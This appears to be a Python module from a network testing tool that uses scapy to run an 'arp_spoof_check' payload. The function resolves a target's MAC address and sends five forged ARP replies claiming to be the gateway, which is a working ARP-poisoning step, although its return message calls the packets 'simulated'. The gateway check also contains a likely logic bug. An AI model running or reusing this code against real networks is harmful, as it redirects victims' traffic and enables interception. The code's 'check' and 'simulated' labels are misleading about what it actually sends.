import scapy.all as scapy
import sys
import time
import os

def get_available_payloads():
    """Lists payloads available for use."""
    return ['arp_spoof_check']

def run_payload(target_ip, payload_name, interface, duration=1):
    """
    Executes a specific payload against a target IP.
    
    NOTE: MUST BE RUN WITH AUTHORIZATION AND AGAINST APPROVED TARGETS.
    """
    print(f"[!] Executing PAYLOAD '{payload_name}' on {target_ip} via {interface}...")

    if payload_name == 'arp_spoof_check':
        try:
            # 1. Get the target's MAC address
            target_mac = scapy.getmacbyip(target_ip)
            if not target_mac:
                return {"status": "error", "message": f"Could not resolve MAC for target IP: {target_ip}"}

            # 2. Get the local machine's MAC address (our own MAC will be the sender)
            my_mac = scapy.get_if_hwaddr(interface)
            
            # 3. Get the gateway IP. We use the discovery module's logic implicitly.
            # For simplicity, we assume the gateway is the .1 address of the subnet.
            if interface in os.environ.get('GATEWAY_IP', ''):
                gateway_ip = os.environ['GATEWAY_IP'] # Use environment variable if set
            else:
                gateway_ip = ".".join(target_ip.split('.')[:-1]) + ".1" 

            # Create an unsolicited ARP reply (op=2) pretending we are the router (gateway_ip)
            # This is a classic step in ARP poisoning.
            arp_packet = scapy.ARP(
                op=2, 
                psrc=gateway_ip,      # We claim to be the router
                hwdst=target_mac,     # Sent to the target
                pdst=target_ip,       # Sent to the target IP
                hwsrc=my_mac          # Using our own MAC as the source MAC in the Ethernet frame
            )
            
            # Send the packet 5 times to ensure delivery
            scapy.send(arp_packet, iface=interface, count=5, verbose=False)
            
            return {"status": "success", "message": f"Simulated ARP spoof packet (claiming to be {gateway_ip}) sent 5 times to {target_ip}."}
            
        except Exception as e:
            return {"status": "error", "message": f"Payload execution failed: {e}"}

    return {"status": "error", "message": f"Payload '{payload_name}' not implemented or invalid."}
